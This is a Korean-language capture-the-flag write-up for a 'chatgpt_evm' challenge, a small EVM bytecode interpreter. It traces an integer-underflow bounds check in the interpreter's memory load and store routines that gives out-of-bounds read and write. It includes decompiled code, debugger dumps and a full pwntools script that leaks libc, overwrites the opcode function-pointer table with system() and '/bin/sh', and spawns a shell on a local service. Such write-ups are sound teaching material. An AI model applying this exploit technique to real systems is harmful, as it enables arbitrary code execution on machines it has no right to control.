# chatgpt_evm

# Usage

# Concept
- oob

# Writeup

```
❯ ./chatgpt_evm
Enter bytecode as hex (6080...): 6080
Return value: 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 80
Enter bytecode as hex (6080...): 6080
Return value: 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 80
Enter bytecode as hex (6080...):
```

프로그램을 실행하면 solidity bytecode 를 입력받고, 마지막에 스택의 최상단 값을 출력해주는 것을 볼 수 있습니다. (6080: PUSH1 0x80)

```c++
void __fastcall EVM::EVM(EVM *this)
{
  int i; // [rsp+10h] [rbp-20h]
  int j; // [rsp+14h] [rbp-1Ch]
  int k; // [rsp+18h] [rbp-18h]
  int m; // [rsp+1Ch] [rbp-14h]

  std::vector<unsigned char>::vector((char *)this + 4096);
  Stack::Stack((EVM *)((char *)this + 4120));
  std::unordered_map<uint256,uint256>::unordered_map((char *)this + 4160);
  Memory::Memory((EVM *)((char *)this + 4216));
  for ( i = 0; i <= 255; ++i )
  {
    *((_QWORD *)this + 2 * i) = EVM::unknownOp;
    *((_QWORD *)this + 2 * i + 1) = 0LL;
  }
  *(_QWORD *)this = EVM::opStop;
  *((_QWORD *)this + 1) = 0LL;
  *((_QWORD *)this + 2) = EVM::opAdd;
  *((_QWORD *)this + 3) = 0LL;
  *((_QWORD *)this + 4) = EVM::opMul;
  *((_QWORD *)this + 5) = 0LL;
  *((_QWORD *)this + 6) = EVM::opSub;
  *((_QWORD *)this + 7) = 0LL;
  *((_QWORD *)this + 8) = EVM::opDiv;
  *((_QWORD *)this + 9) = 0LL;
  *((_QWORD *)this + 10) = EVM::opSdiv;
  *((_QWORD *)this + 11) = 0LL;
  *((_QWORD *)this + 12) = EVM::opMod;
  *((_QWORD *)this + 13) = 0LL;
  *((_QWORD *)this + 14) = EVM::opSmod;
```

심볼이 제거되지 않아 EVM 클래스의 생성자 함수를 보면 각 offset 에 명령어 포인터가 들어간다는 것을 볼 수 있습니다. 또한 stack, memory, storage (unordered_map), code (vector<unsigned char>) 멤버변수를 포함하고있다는 것을 확인할 수 있습니다. 지원되는 opcode 는 다음과 같습니다

```c++
enum OpCode {
    STOP = 0x00,
    ADD = 0x01,
    MUL = 0x02,
    SUB = 0x03,
    DIV = 0x04,
    SDIV = 0x05,
    MOD = 0x06,
    SMOD = 0x07,
    ADDMOD = 0x08,
    MULMOD = 0x09,
    EXP = 0x0a,
    SIGNEXTEND = 0x0b,
    MLOAD = 0x51,
    MSTORE = 0x52,
    MSTORE8 = 0x53,
    SLOAD = 0x54,
    SSTORE = 0x55,
    PUSH1 = 0x60,
    PUSH32 = 0x7f,
    DUP1 = 0x80,
    DUP16 = 0x8f,
    SWAP1 = 0x90,
    SWAP16 = 0x9f,
};
```

```c++
__int64 __fastcall EVM::loadProgram(__int64 a1, __int64 a2)
{
  return std::vector<unsigned char>::operator=(a1 + 4096, a2);
}
```

hex stream 으로 bytecode를 입력했을 때 EVM::loadProgram 에서 해당 위치에 bytecode가 들어가게됩니다.

```c++
EVM *__fastcall EVM::execute(EVM *this, char *a2)
{
  unsigned __int8 *v2; // rax
  void (__fastcall *v3)(char *); // rax
  unsigned __int64 v4; // rbx
  unsigned __int8 v6; // [rsp+1Fh] [rbp-41h]
  char v7[40]; // [rsp+20h] [rbp-40h] BYREF
  unsigned __int64 v8; // [rsp+48h] [rbp-18h]

  v8 = __readfsqword(0x28u);
  *(a2 + 519) = 0LL;
  while ( Stack::empty((a2 + 4120)) != 1 )
    Stack::pop(v7);
  Memory::Resize((a2 + 4216), 32LL);
  while ( 1 )
  {
    v4 = *(a2 + 519);
    if ( v4 >= std::vector<unsigned char>::size(a2 + 4096) )
      break;
    v2 = std::vector<unsigned char>::operator[](a2 + 4096, *(a2 + 519));
    v6 = *v2;
    if ( (*&a2[16 * *v2] & 1LL) != 0 )
      v3 = *(*&a2[*&a2[16 * v6 + 8]] + *&a2[16 * v6] - 1LL);
    else
      v3 = *&a2[16 * v6];
    v3(&a2[*&a2[16 * v6 + 8]]);
  }
  if ( Stack::empty((a2 + 4120)) != 1 )
    Stack::top(this);
  else
    uint256::uint256(this, 0LL);
  return this;
}
```

EVM::execute 함수에서는 stack 의 값을 모두 비우고, Memory 를 32바이트로 Resize 한 뒤, code 에서 값을 하나씩 불러와 해당하는 함수를 실행시켜줍니다. 

```c++
Memory *__fastcall Memory::GetCopy(Memory *this, __int64 a2, __int64 a3, __int64 a4)
{
  {
    v12 = std::vector<unsigned char>::begin(a2);
    v13 = __gnu_cxx::__normal_iterator<unsigned char const*,std::vector<unsigned char>>::operator+(&v12, a3);
    v14[0] = __gnu_cxx::__normal_iterator<unsigned char const*,std::vector<unsigned char>>::operator+(&v13, a4);
    v11 = std::vector<unsigned char>::end(a2);
    if ( !__gnu_cxx::operator>=<unsigned char const*,std::vector<unsigned char>>(&v11, v14) )
    {
      exception = __cxa_allocate_exception(0x10uLL);
      std::out_of_range::out_of_range(exception, "invalid memory: store empty");
      __cxa_throw(exception, &`typeinfo for'std::out_of_range, &std::out_of_range::~out_of_range);
    }
}
```

취약점은 opMload 함수에서 호출하는 Memory::GetCopy 함수에서 발생합니다. 메모리 경계검사를 다음과같이 수행하는데, offset 값을 int64 형으로 받아 integer underflow 가 발생합니다. opMstore 함수에서 호출하는 Memory::Set32 함수에서도 동일하게 수행하기 때문에 음수 인덱스로 oob read/write 가 가능합니다.

```c++
memory::begin() + (__int64)a3 >= memory::end()
```

```
gef➤  tel 0x000055555557d6d0
0x0055555557d6d0│+0x0000: 0x00555555557ece  →  <EVM::opStop()+0> endbr64         ← $rbx, $rdx, $rsi
0x0055555557d6d8│+0x0008: 0x0000000000000000
0x0055555557d6e0│+0x0010: 0x00555555557f56  →  <EVM::opAdd()+0> endbr64
0x0055555557d6e8│+0x0018: 0x0000000000000000
0x0055555557d6f0│+0x0020: 0x00555555557fce  →  <EVM::opMul()+0> endbr64
0x0055555557d6f8│+0x0028: 0x0000000000000000
...
0x0055555557e6d0│+0x1000: 0x0055555557e7e0  →  0x0000000555518060
0x0055555557e6d8│+0x1008: 0x0055555557e7e3  →  0x0000000000000555
0x0055555557e6e0│+0x1010: 0x0055555557e7e3  →  0x0000000000000555
0x0055555557e6e8│+0x1018: 0x007ffff7fb8000  →  0x0000000000000000
0x0055555557e6f0│+0x1020: 0x007ffff7fbb000  →  0x007ffff7fbb050  →  0x007ffff7fbb0a0  →  0x007ffff7fbb0f0  →  0x0000000000000000
0x0055555557e6f8│+0x1028: 0x007ffff7fb8020  →  0x0000000000000000
0x0055555557e700│+0x1030: 0x0000000000003000
0x0055555557e708│+0x1038: 0x0000000000000002
0x0055555557e710│+0x1040: 0x0055555557e740  →  0x0000000000000000
0x0055555557e718│+0x1048: 0x0000000000000001
0x0055555557e720│+0x1050: 0x0000000000000000
0x0055555557e728│+0x1058: 0x0000000000000000
0x0055555557e730│+0x1060: 0x000000003f800000
0x0055555557e738│+0x1068: 0x0000000000000000
0x0055555557e740│+0x1070: 0x0000000000000000
0x0055555557e748│+0x1078: 0x0055555557e7b0  →  0x0000000000000000
0x0055555557e750│+0x1080: 0x0055555557e7d0  →  0x0000000000000000
0x0055555557e758│+0x1088: 0x0055555557e7d0  →  0x0000000000000000
```

EVM::execute 함수에서의 this 포인터를 살펴보면, 0 ~ 0x1000 까지는 함수주소들이 저장되어있고, 0x1018 에는 Stack, 0x1078 에는 Memory 백터가 저장되어있습니다. Memory 와 this 포인터의 offset 차이를 구해 Stack 주소를 릭하고, 함수 포인터들을 덮을 수 있습니다.

```c++
Stack *__fastcall Stack::allocateMemory(Stack *this)
{
  std::runtime_error *exception; // rbx
  Stack *result; // rax

  *this = mmap(0LL, *(this + 3), 3, 34, -1, 0LL);
  if ( *this == -1LL )
  {
    exception = __cxa_allocate_exception(0x10uLL);
    std::runtime_error::runtime_error(exception, "mmap failed");
    __cxa_throw(exception, &`typeinfo for'std::runtime_error, &std::runtime_error::~runtime_error);
  }
  *(this + 1) = *(this + 3) + *this;
  result = this;
  *(this + 2) = *this;
  return result;
}
```

Stack을 initialize 하는 함수를 보면 0x3000 사이즈만큼 mmap으로 메모리를 할당받는데, 이 경우 libc와의 offset 차이로 libc base 를 구할 수 있습니다. 하지만 주어진 도커환경에서 구해야하기 때문에 offset 계산에 어려움이 있을수 있습니다.

이는 다음과 같은 받법으로 해결할 수 있습니다.

1. heap offset

도커 컴포즈로 실행한 뒤, gdb를 설치해 chatgpt_evm 계정으로 프로세스에 attach 한 뒤 this 포인터와 Memory 의 offset 차이를 계산한다.
 gdb 를 설치하면 libc offset은 달라지겠지만 heap offset은 일정하기 때문에 정확히 구할 수 있습니다.

2. libc offset

도커 컴포즈로 실행한 뒤, gdb 를 설치하지 않고 chatgpt_evm 계정으로 /proc/(pid)/maps 파일을 확인해서 libc offset을 구한다. 이 경우에는gdb 를 설치하지 않았기 때문에 libc offset 이 일정하다. gdb 를 설치했을 경우 libc 할당된 위치 이후에 mmap 주소가 할당되는데, 설치하지 않을 경우 libc 로드된 위치 이전에 할당된다.

```
$rax   : 0x00555555558a6a  →  <EVM::opPush()+0> endbr64
$rbx   : 0x0
$rcx   : 0x0
$rdx   : 0x0055555557d6d0  →  0x00555555557ece  →  <EVM::opStop()+0> endbr64
$rsp   : 0x007fffffffe220  →  0x0055555557d6d0  →  0x00555555557ece  →  <EVM::opStop()+0> endbr64
$rbp   : 0x007fffffffe280  →  0x007fffffffe4e0  →  0x0000000000000001
$rsi   : 0x0
$rdi   : 0x0055555557d6d0  →  0x00555555557ece  →  <EVM::opStop()+0> endbr64
$rip   : 0x00555555557e3c  →  <EVM::execute()+326> call rax
$r8    : 0x0055555557e770  →  0x000000055555557e
$r9    : 0x0
$r10   : 0x007ffff7cfeac0  →  0x0000000100000000
$r11   : 0xef427acd224b87d
$r12   : 0x007fffffffe5f8  →  0x007fffffffe82c  →  "/pwn/hspace/chatgpt_evm/chatgpt_evm"
$r13   : 0x00555555556649  →  <main+0> endbr64
$r14   : 0x00555555569bf8  →  0x00555555556600  →  <__do_global_dtors_aux+0> endbr64
$r15   : 0x007ffff7ffd040  →  0x007ffff7ffe2e0  →  0x00555555554000  →   jg 0x555555554047
$eflags: [zero carry parity adjust sign trap INTERRUPT direction overflow resume virtualx86 identification]
$cs: 0x33 $ss: 0x2b $ds: 0x00 $es: 0x00 $fs: 0x00 $gs: 0x00
─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── stack ────
0x007fffffffe220│+0x0000: 0x0055555557d6d0  →  0x00555555557ece  →  <EVM::opStop()+0> endbr64    ← $rsp
0x007fffffffe228│+0x0008: 0x007fffffffe300  →  0x0000000000000000
0x007fffffffe230│+0x0010: 0x0000000000000003
0x007fffffffe238│+0x0018: 0x600055555557e7e0
0x007fffffffe240│+0x0020: 0x0000000000000000
0x007fffffffe248│+0x0028: 0x0000000000000000
0x007fffffffe250│+0x0030: 0x0000000000000000
0x007fffffffe258│+0x0038: 0x8000000000000000
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────── code:x86:64 ────
   0x555555557e32 <EVM::execute()+316> mov    rdx, QWORD PTR [rbp-0x60]
   0x555555557e36 <EVM::execute()+320> add    rdx, rcx
   0x555555557e39 <EVM::execute()+323> mov    rdi, rdx
 → 0x555555557e3c <EVM::execute()+326> call   rax
   0x555555557e3e <EVM::execute()+328> mov    rax, QWORD PTR [rbp-0x60]
   0x555555557e42 <EVM::execute()+332> mov    rbx, QWORD PTR [rax+0x1038]
   0x555555557e49 <EVM::execute()+339> mov    rax, QWORD PTR [rbp-0x60]
   0x555555557e4d <EVM::execute()+343> add    rax, 0x1000
   0x555555557e53 <EVM::execute()+349> mov    rdi, rax
───────────────────────────────────────────────────────────────────────────────────────────────────────────── arguments (guessed) ────
*0x555555558a6a (
   $rdi = 0x0055555557d6d0 → 0x00555555557ece → <EVM::opStop()+0> endbr64 ,
   $rsi = 0x00000000000000,
   $rdx = 0x0055555557d6d0 → 0x00555555557ece → <EVM::opStop()+0> endbr64 ,
   $rcx = 0x00000000000000
)
```

opcode 호출할 때 context를 확인해보면, rdi 에는 항상 this포인터가 들어가고 이는 첫 번째 함수포인터 주소를 가리키고 있기 때문에, 이 주소에 `/bin/sh` 문자열을 적고 아무 포인터나 system 함수로 덮으면 쉘을 실행시킬 수 있습니다.

```python
r = remote("localhost", 19191)
b = ELF("../prob/for_organizers/chatgpt_evm")
lib = ELF("../prob/for_organizers/libc.so.6")

opcode_table = {
    "STOP": 0x00,
    "ADD": 0x01,
    "MUL": 0x02,
    "SUB": 0x03,
    "DIV": 0x04,
    "SDIV": 0x05,
    "MOD": 0x06,
    "SMOD": 0x07,
    "ADDMOD": 0x08,
    "MULMOD": 0x09,
    "EXP": 0x0a,
    "SIGNEXTEND": 0x0b,
    "MLOAD": 0x51,
    "MSTORE": 0x52,
    "MSTORE8": 0x53,
    "SLOAD": 0x54,
    "SSTORE": 0x55,
    "PUSH1": 0x60,
    "PUSH4": 0x63,
    "PUSH2": 0x61,
    "PUSH32": 0x7f,
    "DUP1": 0x80,
    "DUP16": 0x8f,
    "SWAP1": 0x90,
    "SWAP16": 0x9f,
}

def assemble(evm_code):
    bytecode = bytearray()
    lines = evm_code.strip().split('\n')
    
    for line in lines:
        parts = line.split()
        op = parts[0].upper()
        if op.startswith("PUSH"):
            n = int(op[4:])
            bytecode.append(opcode_table[op])
            value = int(parts[1], 16)
            bytecode.extend(value.to_bytes(n, byteorder='big'))
        else:
            bytecode.append(opcode_table[op])
    
    return bytecode

## leak libc
vtable_offset = 0x11f0
vtable_offset = -vtable_offset & 0xffffffffffffffff
libc_offset = 0xee000 
evm_code = """
PUSH32 {}
MLOAD
STOP
""".format(hex(vtable_offset+0x1018))
bytecode = assemble(evm_code)

r.sendlineafter(": ",bytecode.hex())
r.recvuntil(": ")
data = r.recvline().strip().split(b" ")
leak_1 = b"".join(list(map(lambda x: x.zfill(2), data))).decode()
libc_base = u64(bytes.fromhex(leak_1[:16])) 
libc_base  += libc_offset
log.info("leak libc: "+hex(libc_base))

## system("/bin/sh")
system = libc_base + lib.symbols["system"]

evm_code = """
PUSH32 {}
PUSH32 {}
MSTORE
ADD
""".format(b'/bin/sh\x00'.hex() + "00" * 8 + system.to_bytes(8, 'little').hex() + "00"*8, hex(vtable_offset))
bytecode = assemble(evm_code)
r.sendlineafter(": ",bytecode.hex())

r.interactive()
```